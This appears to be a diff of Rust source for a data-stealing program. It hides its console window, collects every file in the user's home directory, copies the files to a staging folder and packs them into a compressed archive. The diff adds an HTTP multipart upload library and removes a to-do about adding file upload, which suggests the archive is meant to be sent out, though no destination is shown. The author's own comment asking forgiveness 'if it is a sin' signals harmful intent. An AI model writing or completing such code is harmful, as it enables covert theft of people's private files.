@@ -1,10 +1,10 @@
 use std::{fs, path::Path};
 use solcrypt::VarSet;
+use reqwest::blocking::multipart;
 
 #[windows_subsystem = "windows"]
 
-#[tokio::main]
-async fn main() {
+fn main() {
     let varset = VarSet::new(); // Lord forgive this, if according to your judgement it is a sin.
     let homedirfiles = solcrypt::get_all_files(&varset.home);
     
@@ -22,12 +22,9 @@ async fn main() {
             Err(e) => { eprintln!("ERROR: {}, from: {}, to: {}", e, &file, format!("{0}\\{1}", varset.dest, &filename)) },
         }
     }
-    dbg!("Compressing");
 
     
     solcrypt::compress_directory_to_tar_xz(varset.dirpath.clone(), varset.dest.clone()).unwrap();
 
-    
-    // TODO: Add file upload mechanism
 
 }
